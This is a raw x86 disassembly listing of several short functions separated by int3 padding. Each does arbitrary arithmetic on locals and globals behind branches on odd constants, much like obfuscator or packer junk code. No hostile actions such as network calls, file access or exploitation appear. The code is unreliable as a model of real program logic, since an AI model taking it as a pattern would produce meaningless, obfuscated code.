  41f6d8:	cmp    esi,DWORD PTR [ebp-0x4]
  41f6db:	je     0x41f711
  41f6dd:	add    ecx,ecx
  41f6df:	cmp    esi,DWORD PTR [ebp-0x1c]
  41f6e2:	jne    0x41f711
  41f6e4:	mov    edi,DWORD PTR ds:0x42b0cc
  41f6ea:	mov    eax,DWORD PTR [ebp-0x28]
  41f6ed:	add    eax,esi
  41f6ef:	test   eax,0x15
  41f6f4:	je     0x41f711
  41f6f6:	sub    DWORD PTR [ebp-0x28],ecx
  41f6f9:	sub    DWORD PTR [ebp-0x28],ebx
  41f6fc:	mov    esi,DWORD PTR [ebp-0x28]
  41f6ff:	sub    DWORD PTR [ebp-0x28],edi
  41f702:	mov    edx,DWORD PTR ds:0x42b078
  41f708:	or     DWORD PTR [ebp-0x28],esi
  41f70b:	add    DWORD PTR [ebp-0x28],eax
  41f70e:	add    DWORD PTR [ebp-0x28],edx
  41f711:	mov    edx,DWORD PTR [ebp-0x28]
  41f714:	cmp    edx,0xf829
  41f71a:	je     0x41f733
  41f71c:	mov    ebx,DWORD PTR ds:0x42b07c
  41f722:	mov    ecx,0x675e
  41f727:	add    edx,edx
  41f729:	sub    ecx,ebx
  41f72b:	add    ecx,edx
  41f72d:	add    DWORD PTR [ebp-0x28],edi
  41f730:	and    DWORD PTR [ebp-0x28],ecx
  41f733:	pop    edi
  41f734:	mov    DWORD PTR [ebp-0x28],edi
  41f737:	pop    esi
  41f738:	or     edx,edi
  41f73a:	add    DWORD PTR [ebp-0x28],ebx
  41f73d:	cmp    edx,DWORD PTR ds:0x42b07c
  41f743:	je     0x41f78a
  41f745:	sub    edx,ebx
  41f747:	add    edx,eax
  41f749:	mov    ebx,DWORD PTR [ebp-0x28]
  41f74c:	test   esi,0x4a4a
  41f752:	jne    0x41f78a
  41f754:	xor    ecx,ecx
  41f756:	mov    eax,ebx
  41f758:	add    eax,esi
  41f75a:	sub    edx,edi
  41f75c:	cmp    eax,0xffffffba
  41f75f:	je     0x41f78a
  41f761:	sub    DWORD PTR [ebp-0x28],edx
  41f764:	mov    edx,DWORD PTR ds:0x42b058
  41f76a:	mov    ebx,DWORD PTR ds:0x42b0cc
  41f770:	or     DWORD PTR [ebp-0x28],eax
  41f773:	add    DWORD PTR [ebp-0x28],edx
  41f776:	sub    ecx,edx
  41f778:	and    ecx,edi
  41f77a:	and    DWORD PTR [ebp-0x28],ebx
  41f77d:	sub    ecx,esi
  41f77f:	cmp    ecx,DWORD PTR ds:0x42b058
  41f785:	je     0x41f78a
  41f787:	mov    DWORD PTR [ebp-0x28],ecx
  41f78a:	pop    ebx
  41f78b:	cmp    ebx,edi
  41f78d:	jne    0x41f7a7
  41f78f:	mov    ecx,DWORD PTR [ebp-0x28]
  41f792:	cmp    ecx,DWORD PTR ds:0x42b058
  41f798:	jne    0x41f7a7
  41f79a:	sub    ecx,ebx
  41f79c:	test   ecx,0x2166507
  41f7a2:	je     0x41f7a7
  41f7a4:	add    DWORD PTR [ebp-0x28],ecx
  41f7a7:	leave  
  41f7a8:	ret    
  41f7a9:	int3   
  41f7aa:	int3   
  41f7ab:	int3   
  41f7ac:	int3   
  41f7ad:	int3   
  41f7ae:	push   ebp
  41f7af:	mov    ebp,esp
  41f7b1:	sub    esp,0x2c
  41f7b4:	mov    eax,0x9c
  41f7b9:	add    eax,eax
  41f7bb:	xor    ecx,ecx
  41f7bd:	mov    DWORD PTR [ebp-0x2c],eax
  41f7c0:	or     eax,ecx
  41f7c2:	add    DWORD PTR [ebp-0x2c],eax
  41f7c5:	push   ebx
  41f7c6:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f7c9:	add    ecx,eax
  41f7cb:	add    DWORD PTR [ebp-0x2c],ecx
  41f7ce:	push   esi
  41f7cf:	mov    edx,0xa1
  41f7d4:	mov    edx,0x87
  41f7d9:	add    edx,eax
  41f7db:	or     edx,eax
  41f7dd:	and    DWORD PTR [ebp-0x2c],edx
  41f7e0:	push   edi
  41f7e1:	mov    ebx,0x7c
  41f7e6:	or     DWORD PTR [ebp-0x2c],eax
  41f7e9:	mov    esi,0x45
  41f7ee:	add    DWORD PTR [ebp-0x2c],ebx
  41f7f1:	add    DWORD PTR [ebp-0x2c],ecx
  41f7f4:	and    esi,ecx
  41f7f6:	sub    esi,eax
  41f7f8:	cmp    esi,DWORD PTR [ebp-0x8]
  41f7fb:	jne    0x41f95c
  41f801:	mov    edi,DWORD PTR [ebp-0x2c]
  41f804:	cmp    ecx,DWORD PTR [ebp-0x14]
  41f807:	je     0x41f95c
  41f80d:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f810:	or     DWORD PTR [ebp-0x2c],esi
  41f813:	and    ecx,eax
  41f815:	or     DWORD PTR [ebp-0x2c],ecx
  41f818:	and    edi,ebx
  41f81a:	and    edi,esi
  41f81c:	mov    edx,DWORD PTR [ebp-0x2c]
  41f81f:	cmp    edx,0x73
  41f822:	je     0x41f95c
  41f828:	mov    ebx,DWORD PTR [ebp-0x2c]
  41f82b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f82e:	cmp    edi,DWORD PTR [ebp-0x2c]
  41f831:	jne    0x41f95c
  41f837:	add    DWORD PTR [ebp-0x2c],eax
  41f83a:	and    DWORD PTR [ebp-0x2c],edx
  41f83d:	add    ebx,edx
  41f83f:	mov    eax,0x6f
  41f844:	add    DWORD PTR [ebp-0x2c],esi
  41f847:	add    ebx,ecx
  41f849:	cmp    ebx,0x34
  41f84c:	jne    0x41f95c
  41f852:	xor    esi,esi
  41f854:	or     DWORD PTR [ebp-0x2c],eax
  41f857:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f85a:	test   ebx,0x4c
  41f860:	je     0x41f95c
  41f866:	cmp    edx,ebx
  41f868:	je     0x41f95c
  41f86e:	xor    eax,eax
  41f870:	sub    esi,ebx
  41f872:	sub    DWORD PTR [ebp-0x2c],edi
  41f875:	mov    edx,0xe0
  41f87a:	xor    DWORD PTR [ebp-0x2c],ecx
  41f87d:	add    esi,ebx
  41f87f:	sub    esi,edi
  41f881:	add    eax,edi
  41f883:	cmp    esi,DWORD PTR [ebp-0x2c]
  41f886:	je     0x41f95c
  41f88c:	mov    ebx,0x3
  41f891:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f894:	sub    DWORD PTR [ebp-0x2c],esi
  41f897:	add    DWORD PTR [ebp-0x2c],ebx
  41f89a:	cmp    eax,ebx
  41f89c:	je     0x41f95c
  41f8a2:	add    edx,edx
  41f8a4:	sub    DWORD PTR [ebp-0x2c],ecx
  41f8a7:	mov    ebx,DWORD PTR [ebp-0x2c]
  41f8aa:	mov    ecx,0x5a
  41f8af:	cmp    eax,0xffffff88
  41f8b2:	jne    0x41f95c
  41f8b8:	test   eax,0xcf
  41f8bd:	je     0x41f95c
  41f8c3:	mov    edi,DWORD PTR [ebp-0x2c]
  41f8c6:	xor    esi,esi
  41f8c8:	cmp    edi,eax
  41f8ca:	jne    0x41f95c
  41f8d0:	add    ebx,edi
  41f8d2:	add    DWORD PTR [ebp-0x2c],edi
  41f8d5:	mov    edi,DWORD PTR [ebp-0x2c]
  41f8d8:	or     DWORD PTR [ebp-0x2c],ebx
  41f8db:	sub    edi,edx
  41f8dd:	sub    ecx,ebx
  41f8df:	add    eax,esi
  41f8e1:	sub    DWORD PTR [ebp-0x2c],edi
  41f8e4:	add    DWORD PTR [ebp-0x2c],ebx
  41f8e7:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41f8ea:	jne    0x41f95c
  41f8ec:	cmp    eax,ecx
  41f8ee:	jne    0x41f95c
  41f8f0:	cmp    eax,0x3d70
  41f8f5:	jne    0x41f95c
  41f8f7:	mov    esi,DWORD PTR [ebp-0x2c]
  41f8fa:	sub    eax,esi
  41f8fc:	test   eax,0x9e94
  41f901:	jne    0x41f95c
  41f903:	add    ecx,edi
  41f905:	add    DWORD PTR [ebp-0x2c],eax
  41f908:	and    ecx,esi
  41f90a:	mov    edi,0x44
  41f90f:	mov    ebx,edi
  41f911:	test   ecx,0xae
  41f917:	jne    0x41f95c
  41f919:	cmp    esi,0x1
  41f91c:	jne    0x41f95c
  41f91e:	mov    edi,DWORD PTR [ebp-0x2c]
  41f921:	add    DWORD PTR [ebp-0x2c],edi
  41f924:	add    ecx,edx
  41f926:	mov    edx,DWORD PTR [ebp-0x2c]
  41f929:	sub    edx,ebx
  41f92b:	sub    DWORD PTR [ebp-0x2c],ecx
  41f92e:	or     edx,ecx
  41f930:	sub    edx,esi
  41f932:	sub    edx,esi
  41f934:	add    edx,esi
  41f936:	sub    edx,ecx
  41f938:	or     edx,ecx
  41f93a:	cmp    edx,0xffffffd6
  41f93d:	jne    0x41f95c
  41f93f:	mov    ecx,0x5b
  41f944:	mov    ebx,0x1604
  41f949:	sub    DWORD PTR [ebp-0x2c],esi
  41f94c:	add    DWORD PTR [ebp-0x2c],ecx
  41f94f:	add    DWORD PTR [ebp-0x2c],edx
  41f952:	add    ebx,ecx
  41f954:	sub    DWORD PTR [ebp-0x2c],eax
  41f957:	add    ebx,edi
  41f959:	sub    DWORD PTR [ebp-0x2c],ebx
  41f95c:	mov    eax,DWORD PTR [ebp-0x2c]
  41f95f:	mov    edi,DWORD PTR [ebp-0x2c]
  41f962:	sub    edi,eax
  41f964:	test   edi,0x830a
  41f96a:	jne    0x41f97b
  41f96c:	add    edi,ebx
  41f96e:	add    edi,eax
  41f970:	sub    DWORD PTR [ebp-0x2c],eax
  41f973:	cmp    edi,0xfffffff8
  41f976:	jne    0x41f97b
  41f978:	add    DWORD PTR [ebp-0x2c],edi
  41f97b:	cmp    edi,eax
  41f97d:	je     0x41f9b2
  41f97f:	mov    eax,DWORD PTR [ebp-0x2c]
  41f982:	cmp    edx,0xfffffffb
  41f985:	jne    0x41f9b2
  41f987:	mov    ecx,DWORD PTR ds:0x42b060
  41f98d:	mov    edi,0xe7
  41f992:	cmp    eax,0xefc6
  41f997:	je     0x41f9b2
  41f999:	add    DWORD PTR [ebp-0x2c],ebx
  41f99c:	mov    ebx,DWORD PTR [ebp-0x2c]
  41f99f:	or     edi,ecx
  41f9a1:	add    ebx,edx
  41f9a3:	mov    ecx,0x66
  41f9a8:	sub    ebx,eax
  41f9aa:	sub    DWORD PTR [ebp-0x2c],edi
  41f9ad:	and    ebx,ecx
  41f9af:	and    DWORD PTR [ebp-0x2c],ebx
  41f9b2:	test   esi,0x55fe
  41f9b8:	jne    0x41f9bd
  41f9ba:	xor    DWORD PTR [ebp-0x2c],edx
  41f9bd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f9c0:	mov    DWORD PTR [ebp-0x2c],ecx
  41f9c3:	pop    edi
  41f9c4:	sub    DWORD PTR [ebp-0x2c],edx
  41f9c7:	pop    esi
  41f9c8:	sub    eax,esi
  41f9ca:	cmp    edi,esi
  41f9cc:	jne    0x41fa0d
  41f9ce:	add    eax,esi
  41f9d0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f9d3:	sub    ecx,ebx
  41f9d5:	mov    edx,eax
  41f9d7:	add    DWORD PTR [ebp-0x2c],edx
  41f9da:	sub    ecx,edi
  41f9dc:	sub    ecx,eax
  41f9de:	sub    ecx,edx
  41f9e0:	cmp    ecx,eax
  41f9e2:	jne    0x41fa0d
  41f9e4:	mov    ebx,0x3c
  41f9e9:	cmp    eax,esi
  41f9eb:	je     0x41fa0d
  41f9ed:	mov    edx,0xe3
  41f9f2:	add    DWORD PTR [ebp-0x2c],ecx
  41f9f5:	mov    ecx,DWORD PTR [ebp-0x2c]
  41f9f8:	mov    DWORD PTR [ebp-0x2c],edx
  41f9fb:	add    ebx,eax
  41f9fd:	add    ebx,edi
  41f9ff:	sub    ecx,eax
  41fa01:	sub    ebx,edx
  41fa03:	mov    DWORD PTR [ebp-0x2c],ebx
  41fa06:	and    ecx,edi
  41fa08:	add    ecx,esi
  41fa0a:	add    DWORD PTR [ebp-0x2c],ecx
  41fa0d:	pop    ebx
  41fa0e:	mov    eax,DWORD PTR [ebp-0x2c]
  41fa11:	add    eax,ebx
  41fa13:	sub    eax,ecx
  41fa15:	sub    DWORD PTR [ebp-0x2c],eax
  41fa18:	leave  
  41fa19:	ret    
  41fa1a:	int3   
  41fa1b:	int3   
  41fa1c:	int3   
  41fa1d:	int3   
  41fa1e:	int3   
  41fa1f:	push   ebp
  41fa20:	mov    ebp,esp
  41fa22:	sub    esp,0x1c
  41fa25:	mov    ecx,0x7b
  41fa2a:	mov    ecx,0xab6d
  41fa2f:	mov    DWORD PTR [ebp-0x4],ecx
  41fa32:	push   ebx
  41fa33:	xor    ebx,ebx
  41fa35:	and    DWORD PTR [ebp-0x4],ecx
  41fa38:	xor    eax,eax
  41fa3a:	or     DWORD PTR [ebp-0x4],eax
  41fa3d:	mov    DWORD PTR [ebp-0x4],ebx
  41fa40:	push   esi
  41fa41:	add    eax,ecx
  41fa43:	mov    esi,ebx
  41fa45:	or     esi,ecx
  41fa47:	mov    DWORD PTR [ebp-0x4],esi
  41fa4a:	or     eax,ebx
  41fa4c:	mov    eax,DWORD PTR [ebp-0x4]
  41fa4f:	cmp    eax,0x71
  41fa52:	jne    0x41fa96
  41fa54:	cmp    eax,0x40
  41fa57:	jne    0x41fa96
  41fa59:	mov    esi,DWORD PTR ds:0x42b074
  41fa5f:	add    esi,ecx
  41fa61:	add    DWORD PTR [ebp-0x4],esi
  41fa64:	mov    edx,0x9a
  41fa69:	cmp    eax,DWORD PTR [ebp-0x10]
  41fa6c:	jne    0x41fa96
  41fa6e:	add    edx,ecx
  41fa70:	mov    ebx,ecx
  41fa72:	and    ebx,esi
  41fa74:	xor    DWORD PTR [ebp-0x4],ebx
  41fa77:	sub    DWORD PTR [ebp-0x4],eax
  41fa7a:	mov    esi,DWORD PTR [ebp-0x4]
  41fa7d:	sub    DWORD PTR [ebp-0x4],edx
  41fa80:	add    esi,eax
  41fa82:	and    esi,ecx
  41fa84:	cmp    esi,DWORD PTR [ebp-0x18]
  41fa87:	je     0x41fa96
  41fa89:	add    esi,ecx
  41fa8b:	mov    ecx,0xa7e5
  41fa90:	add    DWORD PTR [ebp-0x4],esi
  41fa93:	mov    DWORD PTR [ebp-0x1c],ecx
  41fa96:	push   edi
  41fa97:	mov    edi,DWORD PTR ds:0x42b080
  41fa9d:	and    edi,ecx
  41fa9f:	sub    DWORD PTR [ebp-0x4],ebx
  41faa2:	mov    esi,edi
  41faa4:	sub    DWORD PTR [ebp-0x4],eax
  41faa7:	cmp    eax,0x6c7d
  41faac:	je     0x41fab1
  41faae:	xor    DWORD PTR [ebp-0x4],ebx
  41fab1:	or     DWORD PTR [ebp-0x4],esi
  41fab4:	cmp    eax,0xf55
  41fab9:	jne    0x41fac7
  41fabb:	mov    ecx,DWORD PTR ds:0x42b080
  41fac1:	add    DWORD PTR [ebp-0x4],ebx
  41fac4:	add    DWORD PTR [ebp-0x4],ecx
  41fac7:	mov    edx,DWORD PTR [ebp-0x4]
  41faca:	sub    DWORD PTR [ebp-0x4],ebx
  41facd:	and    edx,edi
  41facf:	mov    ebx,edi
  41fad1:	and    DWORD PTR [ebp-0x4],edx
  41fad4:	or     DWORD PTR [ebp-0x4],ebx
  41fad7:	mov    edi,DWORD PTR [ebp-0x4]
  41fada:	cmp    edi,esi
  41fadc:	je     0x41fb18
  41fade:	mov    ebx,esi
  41fae0:	xor    ebx,ebx
  41fae2:	add    ebx,ebx
  41fae4:	or     DWORD PTR [ebp-0x4],edx
  41fae7:	sub    edi,esi
  41fae9:	test   edi,0x4f48
  41faef:	jne    0x41fb18
  41faf1:	mov    ecx,DWORD PTR [ebp-0x4]
  41faf4:	cmp    edx,0xffffff8d
  41faf7:	jne    0x41fb18
  41faf9:	sub    DWORD PTR [ebp-0x4],ebx
  41fafc:	mov    edx,DWORD PTR [ebp-0x4]
  41faff:	sub    edx,ecx
  41fb01:	sub    edx,esi
  41fb03:	add    DWORD PTR [ebp-0x4],edx
  41fb06:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb09:	add    edi,ecx
  41fb0b:	cmp    edi,0x14141001
  41fb11:	jne    0x41fb18
  41fb13:	sub    edi,esi
  41fb15:	add    DWORD PTR [ebp-0x4],edi
  41fb18:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb1b:	or     DWORD PTR [ebp-0x4],ecx
  41fb1e:	pop    edi
  41fb1f:	test   edi,0xda2d
  41fb25:	je     0x41fb49
  41fb27:	cmp    edi,0x4
  41fb2a:	je     0x41fb49
  41fb2c:	mov    edx,DWORD PTR ds:0x42b098
  41fb32:	and    edx,ebx
  41fb34:	mov    ebx,DWORD PTR [ebp-0x4]
  41fb37:	sub    DWORD PTR [ebp-0x4],edi
  41fb3a:	sub    ebx,eax
  41fb3c:	add    edx,ebx
  41fb3e:	test   ecx,0x389d
  41fb44:	je     0x41fb49
  41fb46:	add    DWORD PTR [ebp-0x4],edx
  41fb49:	pop    esi
  41fb4a:	cmp    esi,DWORD PTR [ebp-0x8]
  41fb4d:	je     0x41fb72
  41fb4f:	mov    edx,DWORD PTR [ebp-0x4]
  41fb52:	xor    eax,eax
  41fb54:	sub    DWORD PTR [ebp-0x4],edx
  41fb57:	cmp    esi,0xffffffdc
  41fb5a:	jne    0x41fb72
  41fb5c:	cmp    esi,0xffffff8a
  41fb5f:	jne    0x41fb72
  41fb61:	sub    eax,edi
  41fb63:	and    eax,esi
  41fb65:	mov    ebx,esi
  41fb67:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb6a:	sub    ecx,eax
  41fb6c:	and    DWORD PTR [ebp-0x4],ecx
  41fb6f:	and    DWORD PTR [ebp-0x4],ebx
  41fb72:	pop    ebx
  41fb73:	add    DWORD PTR [ebp-0x4],ebx
  41fb76:	leave  
  41fb77:	ret    
  41fb78:	int3   
  41fb79:	int3   
  41fb7a:	int3   
  41fb7b:	int3   
  41fb7c:	int3   
  41fb7d:	push   ebp
  41fb7e:	mov    ebp,esp
  41fb80:	sub    esp,0x40
  41fb83:	mov    eax,0x5c
  41fb88:	mov    ecx,0x75
  41fb8d:	sub    eax,ecx
  41fb8f:	mov    DWORD PTR [ebp-0x10],eax
  41fb92:	push   ebx
  41fb93:	and    DWORD PTR [ebp-0x10],eax
  41fb96:	push   esi
  41fb97:	add    eax,ecx
  41fb99:	add    DWORD PTR [ebp-0x10],eax
  41fb9c:	push   edi
  41fb9d:	xor    edi,edi
  41fb9f:	sub    DWORD PTR [ebp-0x10],edi
  41fba2:	add    ecx,eax
  41fba4:	add    DWORD PTR [ebp-0x10],eax
  41fba7:	mov    eax,DWORD PTR [ebp-0x10]
  41fbaa:	xor    DWORD PTR [ebp-0x10],ecx
  41fbad:	cmp    eax,0xc0dd
  41fbb2:	je     0x41fbb7
  41fbb4:	sub    DWORD PTR [ebp-0x10],eax
  41fbb7:	xor    eax,eax
  41fbb9:	add    edi,eax
  41fbbb:	mov    ebx,DWORD PTR [ebp-0x10]
  41fbbe:	sub    edi,ebx
  41fbc0:	cmp    edi,0x74aa
  41fbc6:	jne    0x41fc14
  41fbc8:	mov    ebx,ecx
  41fbca:	xor    DWORD PTR [ebp-0x10],ebx
  41fbcd:	mov    ebx,DWORD PTR [ebp-0x10]
  41fbd0:	or     ebx,eax
  41fbd2:	cmp    edi,0x376f
  41fbd8:	jne    0x41fc14
  41fbda:	mov    edx,DWORD PTR [ebp-0x10]
  41fbdd:	sub    DWORD PTR [ebp-0x10],ebx
  41fbe0:	mov    esi,DWORD PTR [ebp-0x10]
  41fbe3:	add    edx,edi
  41fbe5:	cmp    ebx,0x7d
  41fbe8:	jne    0x41fc14
  41fbea:	mov    eax,DWORD PTR [ebp-0x10]
  41fbed:	test   edx,0xe1
  41fbf3:	jne    0x41fc14
  41fbf5:	cmp    eax,edx
  41fbf7:	je     0x41fc14
  41fbf9:	xor    ebx,ebx
  41fbfb:	mov    ecx,DWORD PTR [ebp-0x10]
  41fbfe:	add    DWORD PTR [ebp-0x10],eax
  41fc01:	add    DWORD PTR [ebp-0x10],esi
  41fc04:	sub    DWORD PTR [ebp-0x10],ecx
  41fc07:	add    ebx,ebx
  41fc09:	sub    edx,ecx
  41fc0b:	add    DWORD PTR [ebp-0x10],eax
  41fc0e:	sub    DWORD PTR [ebp-0x10],edx
  41fc11:	add    DWORD PTR [ebp-0x10],ebx
  41fc14:	sub    esi,edx
  41fc16:	mov    eax,DWORD PTR [ebp-0x10]
  41fc19:	mov    edx,DWORD PTR [ebp-0x10]
  41fc1c:	sub    esi,ecx
  41fc1e:	add    DWORD PTR [ebp-0x10],eax
  41fc21:	sub    edx,ebx
  41fc23:	sub    DWORD PTR [ebp-0x10],edx
  41fc26:	sub    DWORD PTR [ebp-0x10],esi
  41fc29:	mov    edi,DWORD PTR [ebp-0x10]
  41fc2c:	sub    edi,ecx
  41fc2e:	or     DWORD PTR [ebp-0x10],edi
  41fc31:	pop    edi
  41fc32:	cmp    edi,DWORD PTR [ebp-0x10]
  41fc35:	je     0x41fc87
  41fc37:	mov    esi,ebx
  41fc39:	add    esi,edx
  41fc3b:	or     esi,edx
  41fc3d:	mov    ecx,0x8b
  41fc42:	add    ecx,edx
  41fc44:	sub    DWORD PTR [ebp-0x10],esi
  41fc47:	cmp    ecx,DWORD PTR [ebp-0x14]
  41fc4a:	je     0x41fc87
  41fc4c:	mov    eax,DWORD PTR [ebp-0x10]
  41fc4f:	cmp    edi,eax
  41fc51:	je     0x41fc87
  41fc53:	mov    edx,ebx
  41fc55:	sub    edx,edi
  41fc57:	mov    esi,0x1cf9
  41fc5c:	add    DWORD PTR [ebp-0x10],edx
  41fc5f:	sub    eax,esi
  41fc61:	sub    eax,ebx
  41fc63:	sub    ecx,edx
  41fc65:	cmp    ecx,DWORD PTR [ebp-0x18]
  41fc68:	je     0x41fc87
  41fc6a:	cmp    eax,0x4d
  41fc6d:	jne    0x41fc87
  41fc6f:	mov    edx,0x8e82
  41fc74:	add    eax,ebx
  41fc76:	mov    ebx,DWORD PTR [ebp-0x10]
  41fc79:	or     ebx,edx
  41fc7b:	add    eax,ebx
  41fc7d:	sub    eax,esi
  41fc7f:	add    DWORD PTR [ebp-0x10],ecx
  41fc82:	sub    eax,ecx
  41fc84:	sub    DWORD PTR [ebp-0x10],eax
  41fc87:	pop    esi
  41fc88:	mov    DWORD PTR [ebp-0x10],esi
  41fc8b:	pop    ebx
  41fc8c:	mov    ecx,DWORD PTR [ebp-0x10]
  41fc8f:	mov    edx,0xea
  41fc94:	mov    DWORD PTR [ebp-0x10],edx
  41fc97:	or     DWORD PTR [ebp-0x10],ebx
  41fc9a:	add    ecx,eax
  41fc9c:	sub    ecx,ebx
  41fc9e:	add    ecx,eax
  41fca0:	xor    DWORD PTR [ebp-0x10],eax
  41fca3:	add    ecx,esi
  41fca5:	xor    DWORD PTR [ebp-0x10],ecx
  41fca8:	leave  
  41fca9:	ret    
